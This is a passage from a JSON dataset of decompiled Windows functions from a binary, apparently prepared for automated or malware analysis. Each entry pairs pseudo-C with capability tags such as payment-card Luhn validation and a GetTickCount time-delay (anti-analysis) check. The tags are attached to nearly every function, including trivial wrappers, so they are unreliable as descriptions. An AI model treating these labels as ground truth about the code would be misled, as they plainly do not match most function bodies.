        "decompiled_code": "\nvoid __cdecl fcn.004127a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4706e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00412500(arg_8h, arg_ch, arg_10h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 131
    },
    "00412890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412890(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004127a0(in_ECX, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 59
    },
    "00412a30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412a30(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470e18;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 4;\n    fcn.00401b10(4);\n    fcn.00417250(arg_8h);\n    var_4h = 0;\n    iVar2 = fcn.004165a0(arg_8h, arg_8h_00, uVar1);\n    iVar2 = fcn.004165a0(*(iVar2 + 0x10));\n    (**(iVar2 + 0xc))();\n    var_4h = 0xffffffff;\n    fcn.004165f0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 295
    },
    "00412ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412ac0(uint param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004265df(param_1);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 116
    },
    "00412ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __thiscall\nfcn.00412ce0(unkuint3 param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            uint param_8, uint param_9, uint param_10, uint param_11, uint param_12, uint param_13, uint param_14)\n\n{\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = param_1;\n    fcn.004172a0(0x496174, &var_1h, _auStack8, unaff_EBP, unaff_retaddr, param_2, param_3, param_4, param_5, param_6, \n                 param_7, param_8, param_9, param_10, param_11, param_12, param_13, param_14);\n    return *0x496180;\n}\n",
        "token_count": 242
    },
    "00412d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412d60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = param_1 + 4;\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + 1;\n    return iVar1 + 1;\n}\n",
        "token_count": 99
    },
    "00412d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412d90(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = param_1 + 1;\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar1 + -1 == 0) {\n        (**(*param_1 + 4))();\n    }\n    return iVar1 + -1;\n}\n",
        "token_count": 126
    },
    "00412f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412f00(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = vtable.Concurrency::details::_CancellationTokenRegistration.0;\n    fcn.00412370();\n    fcn.00412270();\n    fcn.00412d40();\n    return;\n}\n",
        "token_count": 74
    },
    "00413220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00413220(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uVar3;\n    uint var_1ch;\n    uint var_15h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470ed8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00413220::var_ch;\n    uVar3 = 0;\n    fcn.004126a0(0);\n    fcn.00412d60(uVar3, uVar2);\n    *(arg_8h + 0x68) = in_ECX;\n    var_15h._0_1_ = true;\n    arg_8h_00 = 0x413275;\n    cVar1 = fcn.004131f0();\n    if (cVar1 == '\\0') {\n        arg_8h_00 = in_ECX + 0xc;\n        fcn.00416660(arg_8h_00);\n        var_4h = 0;\n        cVar1 = fcn.004131f0();\n        if (cVar1 == '\\0') {\n            fcn.00413080(arg_8h);\n        }\n        var_15h._0_1_ = cVar1 != '\\0';\n        var_4h = 0xffffffff;\n        fcn.00416620();\n    }\n    if (var_15h._0_1_) {\n        fcn.00412f40();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 456
    },
    "004136d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004136d0(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = in_ECX + 0x28;\n    fcn.00416660(arg_8h_00);\n    if (*(in_ECX + 100) < arg_8h) {\n        *(in_ECX + 100) = arg_8h;\n    }\n    fcn.00412290();\n    fcn.00416620();\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 161
    },
    "00413730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413730(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_01;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470f78;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_01 = 8;\n    var_10h = uVar1;\n    fcn.00401b10(8);\n    arg_8h_00 = in_ECX + 0x28;\n    fcn.00416710(arg_8h_00);\n    var_4h = 0;\n    while (*(in_ECX + 100) < arg_8h) {\n        arg_8h_00 = &var_18h;\n        fcn.004122e0(arg_8h_00);\n    }\n    var_4h = 0xffffffff;\n    fcn.004166c0(arg_8h_00, arg_8h_01, uVar1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 352
    },
    "004137c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004137c0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x470fa8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    fcn.00412250(uVar1);\n    fcn.00412230();\n    fcn.00413a20(&arg_8h);\n    *(in_ECX + 100) = 0;\n    var_4h = 0xffffffff;\n    fcn.00413a00();\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 212
    },
    "00413b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00413b60(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00416470(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00413b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00413b80(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.00404a10(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 70
    },
    "00413f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413f40(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4710cb;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00402eb0(0);\n    fcn.00411730(arg_8h);\n    var_4h = 0;\n    fcn.00414060(arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 164
    },
    "00413fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __fastcall fcn.00413fb0(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar3 = fcn.00412870(uVar2, param_1);\n    if (iVar3 == 0) {\n        fcn.004264ce();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00413b60();\n    fcn.004116e0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 236
    },
    "00414020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414020(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    uint var_8h_2;\n    uint var_4h_2;\n    \n    iVar1 = fcn.00412870();\n    if (iVar1 == 0) {\n        fcn.004173d0(param_1, 1);\n    }\n    param_1 = param_1 + 4;\n    fcn.00411730(param_1);\n    fcn.004118e0(param_1);\n    return;\n}\n",
        "token_count": 135
    },
    "00414060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00414060(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.004164b0(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 69
    },
    "00414150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00414150(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.00416410(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 68
    },
    "00414180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00414180(int32_t param_1)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47110e;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    arg_8h = fcn.00412d30();\n    fcn.00411190(arg_8h);\n    fcn.00412920(arg_8h);\n    var_4h = 0;\n    fcn.004134a0(param_1 + 0xc);\n    var_4h._0_1_ = 1;\n    fcn.00414090(param_1 + 0x10);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    fcn.00414130();\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x2d) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 320
    },
    "004142a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004142a0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00413b60(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "004142c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004142c0(int32_t arg_8h)\n\n{\n    return arg_8h + 0x18;\n}\n",
        "token_count": 35
    },
    "00414370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __thiscall fcn.00414370(code **param_1, code *param_2)\n\n{\n    code *pcVar1;\n    int32_t *in_FS_OFFSET;\n    code *var_8h;\n    uint var_ch_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint *arg_8h;\n    uchar auStack44 [8];\n    uint uStack36;\n    uint32_t uStack32;\n    uint var_18h;\n    uchar *puStack24;\n    code **var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_2;\n    \n    uStack12 = 0x471167;\n    var_ch_3 = *in_FS_OFFSET;\n    uStack32 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00414370::var_ch_3;\n    var_4h_2 = 0;\n    *param_1 = vtable.Concurrency::details::_Task_impl_base.0;\n    param_1[1] = NULL;\n    *(param_1 + 2) = 0;\n    *(param_1 + 9) = 0;\n    uStack36 = 0x4143cb;\n    var_10h_2 = param_1;\n    fcn.00416390();\n    var_4h_2._0_1_ = 1;\n    uStack36 = 0x4143da;\n    fcn.00412230();\n    var_4h_2._0_1_ = 2;\n    var_10h_2[0x11] = NULL;\n    var_10h_2[0x13] = NULL;\n    puStack24 = &stack0xffffffd4;\n    arg_8h = &fcn.00414370::var_ch_2;\n    fcn.00413a20(arg_8h);\n    var_18h = fcn.004137c0(arg_8h);\n    var_4h_2._0_1_ = 3;\n    fcn.00413ad0();\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 4);\n    fcn.004142d0(var_10h_2);\n    var_10h_2[0x12] = var_8h;\n    pcVar1 = fcn.004131e0();\n    if (var_10h_2[0x12] != pcVar1) {\n        fcn.00412d60();\n    }\n    var_4h_2 = 0xffffffff;\n    fcn.00413a00();\n    *in_FS_OFFSET = var_ch_3;\n    return var_10h_2;\n}\n",
        "token_count": 638
    },
    "00414480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414480(code **param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.Concurrency::details::_Task_impl_base.0;\n    pcVar2 = fcn.004131e0(uVar1);\n    if (param_1[0x12] != pcVar2) {\n        fcn.00412d90();\n    }\n    fcn.00413b60();\n    fcn.00414ff0();\n    fcn.00412370();\n    fcn.0040e930();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 236
    },
    "00414510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414510(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471198;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    if (*(param_1 + 8) == '\\0') {\n        var_4h = 0;\n        fcn.004138c0();\n        var_4h = 0xffffffff;\n        if (*(param_1 + 9) != '\\0') {\n            fcn.004138e0();\n        }\n    }\n    else {\n        fcn.004138e0();\n    }\n    cVar1 = fcn.00414a20();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004149f0();\n        if (cVar1 != '\\0') {\n            uVar2 = 2;\n            goto code_r0x0041465c;\n        }\n    }\n    else {\n        fcn.00406250();\n        fcn.00414020();\n    }\n    uVar2 = 1;\ncode_r0x0041465c:\n    *in_FS_OFFSET = var_ch_2;\n    return uVar2;\n}\n",
        "token_count": 344
    },
    "00414860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.00414860(uint param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471248;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar3 = 8;\n    var_10h = uVar2;\n    fcn.00401b10(8);\n    arg_8h_00 = &var_18h;\n    fcn.00416280(arg_8h_00);\n    var_4h = 0;\n    arg_8h = 0;\n    cVar1 = fcn.00417560(&var_18h);\n    if (cVar1 != '\\0') {\n        arg_8h = 0;\n        fcn.00406250();\n        fcn.00414670(arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.0040e930(arg_8h, arg_8h_00, uVar3, uVar2, param_1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 386
    },
    "00414a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00414a20(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00415f90(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00414a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414a60(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00414060(in_ECX + 0xb8);\n    return arg_8h;\n}\n",
        "token_count": 65
    },
    "00414aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414aa0(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00414150(arg_8h);\n    return;\n}\n",
        "token_count": 42
    },
    "00414ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414ac0(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x471278;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h = 0;\n    fcn.00413840(var_8h, var_ch_2);\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 160
    },
    "00414d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00414d90(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_4h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_ffffff64;\n    uint32_t uStack100;\n    uint var_48h;\n    uint var_44h;\n    uint var_34h_2;\n    uchar auStack52 [4];\n    uint uStack48;\n    uint var_34h;\n    int32_t **var_24h_2;\n    char cStack33;\n    uint var_1ch_2;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    uint var_40h;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471318;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack100 = *0x49106c ^ &var_40h;\n    puStack20 = &uStack100;\n    *in_FS_OFFSET = &var_ch_2;\n    var_14h_2 = uStack100;\n    fcn.00401b10(8);\n    (**(**var_24h_2 + 8))();\n    var_4h_2 = 0;\n    uStack48 = fcn.00413d70(auStack52);\n    var_4h_2._0_1_ = 1;\n    var_34h = uStack48;\n    cStack33 = fcn.00410320(*var_24h_2 + 2);\n    var_4h_2._0_1_ = 0;\n    fcn.00413e00();\n    if (cStack33 == '\\0') {\n        var_4h_2 = CONCAT31(var_4h_2._1_3_, 2);\n        fcn.00414f30(var_24h_2, &var_1ch_2);\n        fcn.00417590(var_24h_2);\n        fcn.00413ed0();\n    }\n    else {\n        fcn.00406250();\n        fcn.00414ac0();\n    }\n    var_4h_2 = 0xffffffff;\n    fcn.0040e930();\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0043a2e7(in_stack_ffffff64);\n    return;\n}\n",
        "token_count": 616
    },
    "00414f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f00(uint *param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00406250(*param_1, 0xffffffff);\n    fcn.00414ac0();\n    return;\n}\n",
        "token_count": 55
    },
    "00414ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00414ff0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00413a00(param_1);\n    fcn.00412370();\n    fcn.00412270();\n    return;\n}\n",
        "token_count": 73
    },
    "00415040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00415040(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040e930(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00415150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415150(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00415f40(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "00415180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415180(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (in_ECX != arg_8h) {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00415f10(arg_8h_00);\n    }\n    return in_ECX;\n}\n",
        "token_count": 102
    },
    "004151d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004151d0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004142a0(param_1);\n    fcn.004140e0();\n    fcn.004134f0();\n    fcn.00413a00();\n    return;\n}\n",
        "token_count": 84
    },
    "004158e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __fastcall fcn.004158e0(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_2ch = param_1;\n    do {\n        uVar1 = fcn.004033b0(var_2ch);\n        var_20h = fcn.0040e9d0();\n        iVar2 = fcn.0040e4e0();\n        for (; var_20h != iVar2; var_20h = var_20h + 0x18) {\n            fcn.00407620(var_20h);\n            var_2ch = fcn.00401440(&var_1ch);\n            fcn.0041c890(var_2ch);\n            fcn.00404f30();\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(30000, var_2ch, iVar2, uVar1);\n    } while( true );\n}\n",
        "token_count": 319
    },
    "00415980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00415980(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    cVar1 = fcn.004168b0();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00415240(&var_ch, 4);\n        fcn.00426c72(uVar2);\n    }\n    if (*(var_4h + 8) != '\\0') {\n        uVar2 = fcn.00415240(&var_14h, 2);\n        fcn.00426c72(uVar2);\n    }\n    *(var_4h + 8) = 1;\n    return var_4h;\n}\n",
        "token_count": 175
    },
    "00415e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
